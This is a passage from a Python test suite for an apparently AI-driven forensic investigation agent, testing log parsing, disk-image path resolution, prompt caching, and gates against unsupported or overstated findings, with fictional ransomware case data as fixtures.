    assert entry["view_truncated"] is True and entry["view_omitted_chars"] > 0


# ── delimited exports written without line terminators ───────────────────
# A wide header followed by thousands of records and not one line break.

def _unterminated_export(path, records=400, cols=40):
    header = ["num", "date", "time", "src", "type", "action", "rule", "iface",
              "direction", "product", "log_id", "context", "origin", "version",
              "session_key"] + [f"extra{i}" for i in range(cols - 15)]
    body = []
    for n in range(records):
        h, m = divmod(n, 60)
        body += [str(n + 1), "4Feb2031", f"{h % 24}:{m:02d}:01", f"10.0.0.{n % 200 + 1}",
                 "connection", "drop" if n % 7 == 0 else "accept", "", "eth1",
                 "inbound", "fw", "0", "-1", "mgmt", "5", "100000"]
    path.write_text(";".join(header + body) + "\n", encoding="utf-8")
    return header


def test_unterminated_export_is_read_as_rows(tmp_path):
    from core.input_kind import looks_delimited, refuse_raw_scan_of_structured_text
    from tools.tabular import table_pivot, table_query, table_schema
    p = tmp_path / "2031-02-04.log"
    header = _unterminated_export(p)
    assert looks_delimited(str(p))
    assert refuse_raw_scan_of_structured_text(str(p)) is not None
    r = _fn(table_schema)(str(p))
    assert r.get("success"), r
    cols = next(iter(r["sheets"].values()))["columns"]
    assert cols[:4] == ["num", "date", "time", "src"] and len(cols) == len(header)
    q = _fn(table_query)(str(p), where=["action=drop"], limit=1000)
    rows = q.get("rows") or q.get("results") or []
    assert len(rows) == len(range(0, 400, 7)) and rows[0]["src"] == "10.0.0.1"
    pv = _fn(table_pivot)(str(p), group_by=["action"])
    assert pv.get("success"), pv


def test_prose_one_liner_is_not_a_table(tmp_path):
    from core.input_kind import looks_delimited, unterminated_records
    p = tmp_path / "notes.log"
    p.write_text("this is one long line; with some; separators; but no records at all\n")
    assert not looks_delimited(str(p))
    assert unterminated_records(p.read_text(), ";") is None


# ── the schema budget makes room instead of refusing ─────────────────────

def test_full_schema_budget_evicts_a_cold_namespace(monkeypatch):
    from agent import toolbox as tb_mod
    from agent.toolbox import CORE_NAMESPACES, Toolbox
    tb = Toolbox()
    names = sorted((ns for ns in tb.namespaces if ns not in CORE_NAMESPACES),
                   key=tb.namespace_tool_count, reverse=True)
    assert len(names) >= 3
    cold, warm, wanted = names[0], names[1], names[-1]   # cold is the largest, wanted the smallest
    tb.loaded = set(CORE_NAMESPACES) | {cold, warm}
    # pretend warm and the core were just used and cold long ago
    tb._use_clock = 50
    tb._last_used = {warm: 49, cold: 3, **{ns: 49 for ns in CORE_NAMESPACES}}
    budget = tb.schema_count()            # exactly full
    monkeypatch.setattr(tb_mod, "max_openai_tools", lambda: budget)
    r = tb.load_with_budget([wanted])
    assert wanted in tb.loaded and r["evicted"] == [cold] and cold not in tb.loaded
    assert warm in tb.loaded and not r["refused"]
    # nothing cold left → honest refusal
    tb._last_used = {warm: 49, wanted: 50, **{ns: 49 for ns in CORE_NAMESPACES}}
    r2 = tb.load_with_budget([names[3] if len(names) > 3 else cold])
    assert r2["refused"] or r2["evicted"] == []


# ── the loops and dead ends ──────────────────────────────────────────────

def test_missing_path_is_not_replaced_by_a_similar_name(tmp_path):
    from core.discovery_first import try_resolve_missing_path
    (tmp_path / "corp-srv01_mft_strings.txt").write_text("x")
    r = try_resolve_missing_path(str(tmp_path / "CORP-SRV01_MFT.csv"))
    assert r["resolved"] is None
    (tmp_path / "corp-srv01_mft.CSV").write_text("a,b\n1,2\n")
    r2 = try_resolve_missing_path(str(tmp_path / "CORP-SRV01_MFT.csv"))
    assert r2["resolved"] and r2["resolved"].endswith("corp-srv01_mft.CSV")


def test_strings_extract_writes_the_whole_spilled_output(tmp_path, monkeypatch):
    import tools.strings_tools as st
    target = tmp_path / "blob.bin"
    target.write_bytes(b"\x00" * 64)
    spill = tmp_path / "spill.txt"
    spill.write_text("\n".join(f"line{i}" for i in range(5000)) + "\n")
    monkeypatch.setattr(st, "run", lambda cmd, **kw: {
        "success": True, "stdout": "line0\nline1\n[truncated]", "stdout_file": str(spill)})
    out = tmp_path / "strings.txt"
    r = _fn(st.strings_extract)(str(target), min_length=4, unicode=False, output_path=str(out))
    assert r["success"] and r["output_lines"] >= 5000
    assert out.read_text().count("\n") >= 5000


def _trace_with(case, entries):
    (case / "analysis").mkdir(exist_ok=True)
    with open(case / "analysis" / "T_trace.jsonl", "w") as fh:
        for e in entries:
            fh.write(json.dumps({"entry": e}) + "\n")


def test_fls_cap_counts_only_successful_whole_tree_listings(tmp_path):
    from core.access_workflow import _count_fls_in_trace
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    _trace_with(case, [
        {"type": "tool_call", "cmd": "fls -o 2048 /x/img.raw", "success": True},
        {"type": "tool_call", "cmd": "fls -r -o 2048 /x/img.raw", "success": True},
        {"type": "tool_call", "cmd": "fls -o 2048 /x/img.raw 39", "success": True},   # targeted
        {"type": "tool_call", "cmd": "<py>:tsk_tsk_fls", "success": False,
         "failure_class": "gate_refusal"},                                            # refused
    ])
    assert _count_fls_in_trace(case) == 2


def test_winevt_attempt_is_recognised_from_call_arguments():
    from core.evidence_access import winevt_search_attempted_in_cmds
    assert winevt_search_attempted_in_cmds([
        {"cmd": "<py>:strings_strings_grep", "args": '{"pattern": "winevt"}'}])
    assert winevt_search_attempted_in_cmds([{"cmd": "<py>:tsk_tsk_resolve_path"}])
    assert not winevt_search_attempted_in_cmds([{"cmd": "<py>:table_table_query", "args": "{}"}])


def test_work_order_disposition_needs_a_real_attempt(tmp_path):
    from core.access_workflow import _winevt_ledger_disposed
    from core.coverage_ledger import mark_work_order_blocked
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    _trace_with(case, [{"type": "tool_call", "cmd": "<py>:table_table_query", "args": "{}"}])
    assert not mark_work_order_blocked(case, "winevt/Security", reason="x")["success"]
    _trace_with(case, [{"type": "tool_call", "cmd": "<py>:strings_strings_grep",
                        "args": '{"pattern": "Security.evtx"}', "success": True}])
    r = mark_work_order_blocked(case, "winevt/Security", reason="not on this image")
    assert r["success"] and _winevt_ledger_disposed(case)
    assert not mark_work_order_blocked(case, "evidence/x.csv", reason="x")["success"]


def test_resolve_path_walks_directories_case_insensitively(monkeypatch):
    import tools.sleuthkit as sk
    monkeypatch.setattr(sk, "_image_missing", lambda image: None)  # the image is a placeholder
    listings = {
        None: "d/d 39-144-1:\tWindows\nr/r 8-128-1:\tpagefile.sys\n",
        39: "d/d 40-144-1:\tSystem32\n",
        40: "d/d 41-144-1:\twinevt\n",
        41: "d/d 42-144-1:\tLogs\n",
        42: "r/r 43-128-1:\tSecurity.evtx\nr/r 44-128-1:\tSystem.evtx\n",
    }
    calls = []
    def fake_run(cmd, **kw):
        calls.append(cmd)
        inode = int(cmd[-1]) if cmd[-1].isdigit() else None
        return {"success": True, "stdout": listings[inode]}
    monkeypatch.setattr(sk, "run", fake_run)
    r = _fn(sk.tsk_resolve_path)("/x/img.raw", fs_path="windows/system32/WINEVT/logs", offset_sectors=2048)
    assert r["success"] and r["meta_addr"] == 42 and r["path"] == "Windows/System32/winevt/Logs"
    assert [e["name"] for e in r["entries"]] == ["Security.evtx", "System.evtx"]
    assert all("-o" in c for c in calls)
    miss = _fn(sk.tsk_resolve_path)("/x/img.raw", fs_path="Windows/System32/config", offset_sectors=2048)
    assert not miss["success"] and miss["missing"] == "config" and miss["resolved"] == "Windows/System32"


def test_protocol_gates_are_not_investigate_debt():
    from agent.tool_investigate import classify_tool_result
    for gate in ("access_disk_budget", "wrapup_exploration_budget", "identical_call", "wrong_phase"):
        assert classify_tool_result("tsk_tsk_fls", json.dumps({"success": False, "gate": gate, "error": "x"})) is None


def test_stateful_tools_are_exempt_from_the_identical_call_gate():
    from agent.loop import _STATEFUL_TOOL_RE
    for name in ("reason_reason_evaluate_finding", "dair_dair_assess", "misc_record_finding",
                 "coverage_coverage_report", "misc_batch_run", "atlas_finish"):
        assert _STATEFUL_TOOL_RE.search(name), name
    for name in ("table_table_query", "tsk_tsk_fls", "misc_list_evidence_dir", "strings_strings_grep"):
        assert not _STATEFUL_TOOL_RE.search(name), name


def test_dead_run_process_is_reported_as_died(tmp_path):
    from dashboard import read_models as rm
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True); (case / "analysis").mkdir()
    (case / ".atlas" / "run_status.json").write_text(json.dumps({
        "stopped_reason": "running", "finish_status": "", "turns": 150, "pid": 2_000_000_000,
        "activity": "\u23f5 strings_strings_grep", "updated_at": "2031-02-04T12:00:00Z"}))
    act = rm.activity_projection(str(case))
    assert not act["busy"]
    assert act["last_stop"] and act["last_stop"]["reason"] == "died"
    assert "150" in act["last_stop"]["error"]


def test_interrupted_run_still_leaves_a_report(tmp_path):
    """The dashboard Stop path (SIGTERM → KeyboardInterrupt) ends with the
    same auto-assembled report as any other end."""
    from agent.cli import _ensure_report_on_exit
    case = tmp_path / "case"
    (case / ".atlas").mkdir(parents=True); (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- What happened?\n", encoding="utf-8")
    _graph_with_claims(case, 1)

    class Stopped:
        stats = {"stopped_reason": "keyboard_interrupt", "finish_status": "interrupted"}
        def _report_written(self):
            return False
    import core.report_projection as rp
    rp._PROVIDER_DOWN_UNTIL[0] = 0.0
    _orig = rp.default_llm_section_generator
    rp.default_llm_section_generator = lambda ctx, sec: (_ for _ in ()).throw(RuntimeError("no provider"))
    try:
        _ensure_report_on_exit(case, Stopped())
    finally:
        rp.default_llm_section_generator = _orig
        rp._PROVIDER_DOWN_UNTIL[0] = 0.0
    assert (case / "reports" / "T_investigation_report.md").is_file()


def test_sigterm_is_routed_to_the_interrupt_path():
    import inspect, signal
    from agent import cli
    src = inspect.getsource(cli)
    assert "_signal.signal(_signal.SIGTERM, _on_sigterm)" in src
    assert "raise KeyboardInterrupt" in src.split("def _on_sigterm")[1][:120]


# ── cost: prompt caching instead of a ceiling ────────────────────────────

def test_no_token_ceiling_in_the_loop():
    import inspect
    from agent import loop
    src = inspect.getsource(loop)
    assert "MAX_INPUT_TOKENS" not in src and "token_cap" not in src


def test_cached_tokens_are_parsed_from_both_usage_dialects():
    from agent.llm import cached_input_tokens, parse_response
    body = {"choices": [{"message": {"content": "x"}, "finish_reason": "stop"}],
            "usage": {"prompt_tokens": 60000, "completion_tokens": 50,
                      "prompt_tokens_details": {"cached_tokens": 47000}}}
    r = parse_response(body)
    assert r.cached_tokens == 47000 and r.input_tokens == 60000
    assert cached_input_tokens({"cache_read_input_tokens": 12}) == 12
    assert cached_input_tokens({"prompt_tokens": 5}) == 0


def test_cache_breakpoints_only_for_anthropic_models():
    from agent.llm import mark_cache_breakpoints
    msgs = lambda: [{"role": "system", "content": "playbook"},
                    {"role": "user", "content": "case brief"},
                    {"role": "user", "content": "later"}]
    p = mark_cache_breakpoints({"messages": msgs()}, "anthropic/claude-sonnet-4.5")
    assert p["messages"][0]["content"][0]["cache_control"] == {"type": "ephemeral"}
    assert p["messages"][1]["content"][0]["cache_control"] == {"type": "ephemeral"}
    assert p["messages"][2]["content"] == "later"
    q = mark_cache_breakpoints({"messages": msgs()}, "z-ai/glm-5.2", "openrouter")
    assert q["messages"][0]["content"] == "playbook"


def test_compaction_moves_in_batches_to_keep_the_prefix_stable():
    from core.llm_check import compact_aged_messages, _TOOL_STUB
    msgs = _conv(20, tool_chars=800)      # 20 tool results
    # 8 are beyond the keep window of 12 → batch of 6 is due → all 8 stubbed
    assert compact_aged_messages(msgs, keep_tool_results=12, keep_turn_text=100, batch=6) == 8
    stubbed = [m for m in msgs if m.get("role") == "tool" and m["content"] == _TOOL_STUB]
    assert len(stubbed) == 8
    # two more results → only 2 due → nothing changes until 6 are due
    for t in range(20, 22):
        msgs.append({"role": "assistant", "content": "t", "tool_calls": []})
        msgs.append({"role": "tool", "tool_call_id": f"c{t}", "content": "r" * 800})
    assert compact_aged_messages(msgs, keep_tool_results=12, keep_turn_text=100, batch=6) == 0


def test_prefix_reuse_counts_identical_leading_messages():
    from agent.loop import Agent

    class Fake:
        messages = [{"role": "system", "content": "s"}, {"role": "user", "content": "a"}]
    f = Fake()
    first = Agent._prefix_reuse(f)
    assert first == {"reused_messages": 0, "messages": 2}
    f.messages = f.messages + [{"role": "assistant", "content": "b"}]
    assert Agent._prefix_reuse(f) == {"reused_messages": 2, "messages": 3}
    f.messages[1] = {"role": "user", "content": "changed"}
    assert Agent._prefix_reuse(f)["reused_messages"] == 1


def test_resolve_path_argument_is_not_a_host_path(tmp_path):
    """The path names a location inside the image; discovery-first must not
    demand that it exist on the host (otherwise it refuses every call)."""
    from core.discovery_first import DISCOVERY_TOOL_RE, check_and_resolve_input_paths
    assert DISCOVERY_TOOL_RE.search("tsk_tsk_resolve_path")
    args, res = check_and_resolve_input_paths(
        "tsk_tsk_resolve_path", {"image": str(tmp_path), "fs_path": "Windows/System32/winevt/Logs"},
        case_dir=tmp_path)
    assert args["fs_path"] == "Windows/System32/winevt/Logs"


# ── a narrated tool call is asked for, not counted as silence ───────────

def test_intent_without_call_is_detected():
    from agent.loop import _INTENT_RE, _NO_CALL_MSG, Agent

    class TB:
        tools = {"table_table_query": type("T", (), {"alias": "table.table_query"})()}

    class Fake:
        toolbox = TB()
    f = Fake()
    assert Agent._describes_a_tool_call(f, "Let me search the MFT CSVs for winevt and .locked files.")
    assert Agent._describes_a_tool_call(f, "Running table.table_query on the firewall log.")
    assert not Agent._describes_a_tool_call(f, "The investigation is complete. Findings F-001 to F-003 answer the questions.")
    assert _INTENT_RE.search("Now I need to extract the event logs.")
    assert "function call" in _NO_CALL_MSG


def test_a_run_that_recorded_nothing_is_not_treated_as_finished():
    """Going quiet means "nothing left to do", which is only true once
    something was done. A model that answers "I need to issue the tool call
    now" and issues none has not finished an investigation; stopping there
    files a completed run over untouched evidence."""
    from agent.loop import NO_WORK_RESCUES_MAX, _NO_CALL_MSG

    assert NO_WORK_RESCUES_MAX >= 1, "the quiet path must ask at least once"
    # The rescue asks for the call itself rather than for a close-out.
    assert "function call" in _NO_CALL_MSG
    assert "report" not in _NO_CALL_MSG.split("complete instead")[0]


def test_an_action_announced_without_a_pronoun_is_still_an_intent():
    """A reply can name its next move without saying "I". Two of those in a
    row used to read as a model with nothing left to do, which spends the
    run's one wrap-up round and leaves a later quiet pair to end the run
    with no report."""
    from agent.loop import _INTENT_RE

    for announced in (
        "Evidence assessment complete: 3 pcaps. Now verifying evidence hashes:",
        "Continuing the investigation. Next step: verify the hashes, then "
        "run the initial hypothesis.",
        "Proceeding to the carve of the unallocated space.",
        "Als naechstes die Pruefsummen.",
    ):
        assert _INTENT_RE.search(announced), announced

    for finished in (
        "The investigation is complete and the report has been written.",
        "No further evidence remains to examine.",
        "All blocking issues are resolved.",
    ):
        assert not _INTENT_RE.search(finished), finished


def test_rescue_names_the_namespace_a_narrated_tool_needs():
    """A run can end quiet naming tools whose namespace it has unloaded.

    The generic "issue the call now" cannot be acted on when the schema is
    not loaded, so the rescue has to name the namespace and the call that
    brings it back.
    """
    from agent.loop import Agent, _no_call_unloaded_msg

    def info(name, namespace, alias):
        return type("T", (), {"name": name, "namespace": namespace,
                              "alias": alias})()

    class TB:
        loaded = {"table"}
        tools = {
            "table_table_query": info("table_table_query", "table",
                                      "table.table_query"),
            "tsk_tsk_fls": info("tsk_tsk_fls", "tsk", "tsk.fls"),
        }

    class Fake:
        toolbox = TB()

    f = Fake()
    named = Agent._named_tools_not_loaded(
        f, "Let me get partition offsets, then use tsk.fls to enumerate users.")
    assert named == [("tsk.fls", "tsk")]
    # A loaded namespace is not reported — that reply needs the plain rescue.
    assert Agent._named_tools_not_loaded(
        f, "Running table.table_query on the firewall log.") == []

    msg = _no_call_unloaded_msg(named)
    assert "tsk.fls" in msg
    assert 'atlas_load_namespaces(["tsk"])' in msg


def test_narrowed_rewrite_drops_universal_and_absence_claims():
    from tools._gates.universal_from_truncated import narrow_statement
    s = ("Dozens of files across Projects/ and Sales/ all carrying .locked — including "
         "budget.xlsx.locked. Pattern consistent with encryption of all company "
         "file shares. No unencrypted documents were observed in shares/.")
    n = narrow_statement(s)
    assert "the observed" in n and " all " not in f" {n} "
    assert "No unencrypted" not in n and "budget.xlsx.locked" in n
    assert narrow_statement("only three hosts had it") == "three hosts had it"


def test_latch_message_says_dair_first_when_no_phase_exists():
    from agent.belief_starvation import format_starvation_message
    cold = format_starvation_message(contacts=3, findings=0, dair_established=False)
    warm = format_starvation_message(contacts=3, findings=0, dair_established=True)
    assert cold.index("dair.dair_assess FIRST") < cold.index("substantive evidence contact")
    assert "FIRST" not in warm


def test_latch_message_separates_findings_from_evidence_notes():
    from agent.belief_starvation import format_starvation_message
    msg = format_starvation_message(contacts=3, findings=0)
    assert "record_agent_message, not findings" in msg and "bears on the case questions" in msg


def test_resolve_path_reads_the_full_listing_from_the_spill(tmp_path, monkeypatch):
    import tools.sleuthkit as sk
    monkeypatch.setattr(sk, "_image_missing", lambda image: None)  # the image is a placeholder
    big = "".join(f"r/r {1000+i}-128-1:\tfile{i:04d}.dll\n" for i in range(3000))
    spill = tmp_path / "fls.stdout"
    spill.write_text(big + "d/d 4242-144-1:\twinevt\n")
    def fake_run(cmd, **kw):
        if cmd[-1].isdigit():
            return {"success": True, "stdout": big[:2000] + "\n[truncated]", "stdout_file": str(spill)}
        return {"success": True, "stdout": "d/d 40-144-1:\tSystem32\n"}
    monkeypatch.setattr(sk, "run", fake_run)
    r = _fn(sk.tsk_resolve_path)("/x/img.raw", fs_path="System32/winevt", offset_sectors=2048)
    assert r["success"] and r["meta_addr"] == 4242


# ── what the loop mechanics cost ─────────────────────────────────────────

def test_dair_window_counts_model_actions_not_bookkeeping(tmp_path):
    from core.execution_log import ExecutionLog
    lg = ExecutionLog()
    (tmp_path / "analysis").mkdir()
    lg.configure("T", str(tmp_path / "analysis" / "trace.json"), save_session=False)
    lg._entries = [{"type": "dair_call", "call_id": 1}] + [
        {"type": "call_initiated", "call_id": 100 + i} for i in range(30)] + [
        {"type": "tool_call", "call_id": 200 + i} for i in range(5)]
    recent = lg.recent_actions(20)
    assert any(e["type"] == "dair_call" for e in recent)
    assert all(e["type"] != "call_initiated" for e in recent)


def test_pivots_skip_case_files_and_unattributed_entities(tmp_path, monkeypatch):
    from core import ioc_pivots
    case = tmp_path / "case"
    for d in (".atlas", "evidence", "exports"):
        (case / d).mkdir(parents=True)
    (case / "evidence" / "HOSTX.vmdk").write_bytes(b"x")
    (case / "exports" / "HOSTX_mft.csv").write_text("a,b\n")
    from core.claim_graph import save_graph, empty_graph
    g = empty_graph()
    g["nodes"]["C0001"] = {"id": "C0001", "kind": "claim", "status": "new", "confidence": "LIKELY",
                           "statement": "HOSTX.vmdk was parsed; HOSTX_mft.csv lists evil.exe run from 10.0.0.9"}
    save_graph(case, g)
    monkeypatch.setattr(ioc_pivots, "build_catalog", lambda cd: {"iocs": [{"value": "evil.exe"}, {"value": "10.0.0.9"}]}, raising=False)
    import core.ioc_catalog as cat
    monkeypatch.setattr(cat, "build_catalog", lambda cd: {"iocs": [{"value": "evil.exe"}, {"value": "10.0.0.9"}]})
    ind = ioc_pivots.indicators_from_beliefs(case)
    assert "file:evil.exe" in ind and "ip:10.0.0.9" in ind
    assert not any("hostx.vmdk" in k or "hostx_mft.csv" in k for k in ind)


def test_json_escaped_windows_paths_are_not_unc_hosts():
    from core.entities import extract
    ents = extract("Process C:\\\\Windows\\\\System32\\\\svchost.exe started")
    assert "host:windows" not in ents and not any(e.startswith("host:") for e in ents)
    assert any(e.startswith("path:") for e in ents)
    unc = extract("copied to \\\\FS02\\share\\x.txt")
    assert "host:fs02" in unc


def test_absence_claim_is_not_contradicted_by_another_host(tmp_path, monkeypatch):
    from core import artifact_value as av
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    from core.claim_graph import save_graph, empty_graph
    g = empty_graph()
    g["nodes"]["C0001"] = {"id": "C0001", "kind": "claim", "status": "new", "confidence": "LIKELY",
                           "host": "DC01", "statement": "No Security.evtx present on DC01"}
    save_graph(case, g)
    monkeypatch.setattr(av, "known_artifacts", lambda cd: {
        "security.evtx": {"name": "Security.evtx", "size": 4096,
                          "source": "exports/SRV01_mft.csv", "host": "SRV01"}})
    monkeypatch.setattr(av, "_case_hosts", lambda cd: ["DC01", "SRV01"])
    assert av.contradicted_absence_claims(case) == []
    monkeypatch.setattr(av, "known_artifacts", lambda cd: {
        "security.evtx": {"name": "Security.evtx", "size": 4096,
                          "source": "exports/DC01_mft.csv", "host": "DC01"}})
    assert av.contradicted_absence_claims(case)


def test_failed_output_file_run_keeps_the_earlier_file(tmp_path):
    from core.execution_log import log
    from core.executor import run_with_output_file
    (tmp_path / "analysis").mkdir()
    log.configure("T", str(tmp_path / "analysis" / "trace.json"), save_session=False)
    out = tmp_path / "analysis" / "note.txt"
    out.write_text("the good extraction")
    r = run_with_output_file(["sh", "-c", "echo partial; exit 3"], output_path=str(out))
    assert not r["success"] and out.read_text() == "the good extraction"
    assert not list((tmp_path / "analysis").glob("*.part-*"))
    r2 = run_with_output_file(["sh", "-c", "echo fresh"], output_path=str(out))
    assert r2["success"] and out.read_text().strip() == "fresh"


def test_strings_grep_searches_the_spilled_output(tmp_path, monkeypatch):
    import tools.strings_tools as st
    target = tmp_path / "listing.stdout"
    target.write_text("x")
    spill = tmp_path / "spill.txt"
    spill.write_text("\n".join(f"r/r {i}-128-1:\tfile{i}.dll" for i in range(3000)) + "\nd/d 9-144-1:\tconfig\n")
    monkeypatch.setattr(st, "run", lambda cmd, **kw: {"success": True, "stdout": "r/r 0-128-1:\tfile0.dll\n[truncated]", "stdout_file": str(spill)})
    r = _fn(st.strings_grep)(str(target), "config", min_length=4)
    assert r["match_count"] >= 1


def test_answered_task_needs_a_claim_about_the_question(tmp_path):
    from core.investigation_tasks import reconcile_case_md, update_task
    from core.claim_graph import save_graph, empty_graph
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True); (case / "evidence").mkdir()
    (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- Was data exfiltrated?\n- What happened on the host?\n", encoding="utf-8")
    reconcile_case_md(case)
    g = empty_graph()
    g["nodes"]["C0001"] = {"id": "C0001", "kind": "claim", "status": "new", "confidence": "LIKELY",
                           "statement": "Ransom note dropped on SRV01 at 2031-02-04 10:00:00 UTC"}
    g["nodes"]["C0002"] = {"id": "C0002", "kind": "claim", "status": "new", "confidence": "LIKELY",
                           "statement": "Data exfiltrated to 203.0.113.9 via rclone at 2031-02-04 11:00:00 UTC"}
    save_graph(case, g)
    r = update_task(case, "task-0001", status="answered", related_claim_ids=["C0001"])
    assert not r["success"] and r["gate"] == "task_answer_unrelated"
    assert update_task(case, "task-0001", status="answered", related_claim_ids=["C0002"])["success"]
    # an umbrella question takes any claim as related, but it is answered
    # only when its standard sub-questions are answered or limited
    r = update_task(case, "task-0002", status="answered", related_claim_ids=["C0001"])
    assert not r["success"] and r["gate"] == "task_parts_open" and "affected" in r["error"]
    assert update_task(case, "task-0002", status="partial", related_claim_ids=["C0001"])["success"]


def test_report_scope_host_must_be_a_known_host(tmp_path, monkeypatch):
    from core.claim_graph import infer_report_scope
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    (case / ".atlas" / "evidence_links.json").write_text(json.dumps(
        {"links": [{"label": "CORP-SRV01", "kind": "disk", "path": "evidence/a.vmdk"}]}))
    assert infer_report_scope("CASE-B_final_report.md", case_dir=case) == {"scope": "case", "host": ""}
    assert infer_report_scope("CASE-B_CORP-SRV01_report.md", case_dir=case)["host"] == "CORP-SRV01"
    assert infer_report_scope("host_CORP-SRV01_report.md", case_dir=case)["scope"] == "host"
    assert infer_report_scope("host_nonexistent_report.md", case_dir=case)["scope"] == "case"
    assert infer_report_scope("CASE-B_estate_report.md", case_dir=case)["scope"] == "estate"


def test_speaks_to_judges_by_the_question_subject():
    from core.answer_synthesis import speaks_to
    ransom = "Ransomware encrypted 800 files on PROD-SQL-02 on 2031-02-04 12:00:00 (.locked extension)."
    account = "Local account tempadmin was created by jane.doe on SRV01."
    rdp = "RDP logon by administrator from 10.0.1.50 on DC01 at 14:18 UTC."
    assert speaks_to("What type of attack happened?", ransom)
    assert speaks_to("Welche Art von Angriff fand statt?", ransom)
    assert not speaks_to("Which accounts were compromised?", ransom)
    assert speaks_to("Which accounts were compromised?", account)
    assert speaks_to("Welche Konten wurden kompromittiert?", account)
    assert speaks_to("Did the attacker move laterally?", rdp)
    assert not speaks_to("How did the attacker get in?", ransom)
    assert speaks_to("How did the attacker get in?", rdp)
    assert speaks_to("When did the intrusion start?", rdp)
    assert speaks_to("Which services ran on DC01?", "Spooler ran as SYSTEM.", "CORP-DC01")
    assert speaks_to("What happened?", ransom)


def test_strings_grep_is_still_a_registered_tool():
    from agent.toolbox import Toolbox
    assert Toolbox().resolve("strings.strings_grep")


def test_prose_written_for_another_scope_goes_stale(tmp_path):
    from core.claim_graph import upsert_claim_from_finding
    from core.report_projection import (bind_claims_to_sections, mark_stale_sections,
                                        regenerate_sections)
    case = tmp_path / "C"; (case / ".atlas").mkdir(parents=True)
    for d in ("evidence", "analysis", "reports"):
        (case / d).mkdir()
    (case / ".atlas" / "evidence_links.json").write_text(json.dumps(
        {"links": [{"label": "PROD-SQL-02", "kind": "disk", "path": "evidence/a.vmdk"}]}))
    r = upsert_claim_from_finding(case, statement="Ransomware encrypted files on PROD-SQL-02.",
                                  confidence="LIKELY", host="PROD-SQL-02")
    assert r["success"], r
    bind_claims_to_sections(case)
    mark_stale_sections(case, force_all=True)
    regenerate_sections(case, generator=lambda ctx, sec: "prose", only_stale=True,
                        report_scope="host", report_host="PROD-SQL-02")
    # Same deliverable again: nothing to redo.
    assert mark_stale_sections(case, report_scope="host", report_host="PROD-SQL-02")["stale_sections"] == []
    # The case report must not reuse prose written for the host report.
    stale = mark_stale_sections(case, report_scope="case")["stale_sections"]
    assert "exec_summary" in stale and "recommendations" in stale


def test_lint_does_not_take_a_case_report_for_a_host_report(tmp_path):
    from tools.misc import _report_lint
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    (case / ".atlas" / "evidence_links.json").write_text(json.dumps(
        {"links": [{"label": "CORP-DC01", "kind": "disk", "path": "evidence/a.vmdk"}]}))
    body = "# R\n\n## 7. Recommendations\n\n- Reset the krbtgt account twice and start domain-wide containment.\n"
    from core.execution_log import log
    with patch.object(log, "case_dir", return_value=str(case)):
        assert not [w for w in _report_lint(body, str(case / "reports" / "CASE-B_final_report.md"))
                    if w.startswith("host_vs_estate")]
        assert [w for w in _report_lint(body, str(case / "reports" / "CASE-B_CORP-DC01_report.md"))
                if w.startswith("host_vs_estate")]


def test_finding_title_drops_a_tier_written_into_the_heading():
    from core.report_assemble import parse_finding_narratives
    prose = ("## 4. Detailed Findings\n\n### F-001 [SUSPECTED]: Firewall log contains 80,000 entries\n\n"
             "**Summary**\n\nA.\n\n### F-002 — Both VMDK images are base disks [LIKELY]\n\n**Summary**\n\nB.\n\n"
             "### F-003 · CONFIRMED: Ransom note found\n\n**Summary**\n\nC.\n")
    nar = parse_finding_narratives(prose)
    assert nar["F-001"]["title"] == "Firewall log contains 80,000 entries"
    assert nar["F-002"]["title"] == "Both VMDK images are base disks"
    assert nar["F-003"]["title"] == "Ransom note found"


def test_latch_lifts_on_a_substantive_note_and_allows_writing_it():
    from agent.belief_starvation import (MIN_NOTE_CHARS, starvation_latched,
                                         tool_allowed_while_latched)
    contact = {"type": "tool_call", "mcp_tool": "table_table_query", "success": True,
               "output": '{"success": true, "matched_rows": 5}'}
    contacts = [dict(contact) for _ in range(4)]
    assert starvation_latched(contacts)
    assert tool_allowed_while_latched("misc_record_agent_message")
    short = {"type": "investigation_narration", "content": "saw a log"}
    assert starvation_latched(contacts + [short])
    note = {"type": "investigation_narration", "content": "x" * MIN_NOTE_CHARS}
    assert not starvation_latched(contacts + [note])


def test_run_start_creates_the_case_layout(tmp_path):
    from agent.cli import _ensure_case_layout, CASE_OUTPUT_SUBDIRS
    case = tmp_path / "C"; case.mkdir(); (case / "evidence").mkdir()
    _ensure_case_layout(case)
    assert all((case / d).is_dir() for d in CASE_OUTPUT_SUBDIRS)
    _ensure_case_layout(case)  # idempotent


def test_unsupported_host_is_dropped_from_a_finding(tmp_path):
    from tools.misc import _drop_unsupported_host
    case = tmp_path / "case"; (case / ".atlas").mkdir(parents=True)
    (case / ".atlas" / "evidence_links.json").write_text(json.dumps({"links": [
        {"label": "CORP-SRV01", "kind": "disk", "path": "evidence/CORP-SRV01.vmdk"},
        {"label": "CORP-DC01", "kind": "disk", "path": "evidence/CORP-DC01.vmdk"}]}))

    class Log:
        _entries = [
            {"call_id": 8, "type": "tool_call", "cmd": "table_table_query evidence/firewall/2031-02-04.log"},
            {"call_id": 9, "type": "tool_call", "cmd": "ez_evtxecmd exports/srv01_Security.evtx"},
        ]
        def case_dir(self):
            return str(case)
    log = Log()
    host, note = _drop_unsupported_host("CORP-SRV01", "Firewall log shows 600 drops.", "", [8], 8, log)
    assert host == "" and "dropped" in note
    host, note = _drop_unsupported_host("CORP-SRV01", "Account tempadmin created (EID 4720).", "", [9], 9, log)
    assert host == "CORP-SRV01" and note == ""            # cited artifact is the host's
    host, note = _drop_unsupported_host("CORP-DC01", "RDP logon on DC01 from 10.0.1.50.", "", [8], 8, log)
    assert host == "CORP-DC01" and note == ""              # the description names it
    host, note = _drop_unsupported_host("workstation-9", "Firewall log shows drops.", "", [8], 8, log)
    assert host == "workstation-9" and note == ""         # unknown host: not this check's job


def test_dair_window_used_counts_actions_after_the_last_assess():
    from core import middleware
    from core.middleware import dair_window_used

    class Log:
        def __init__(self, types):
            self.types = types
        def recent_actions(self, n):
            return [{"type": t} for t in self.types][-n:]
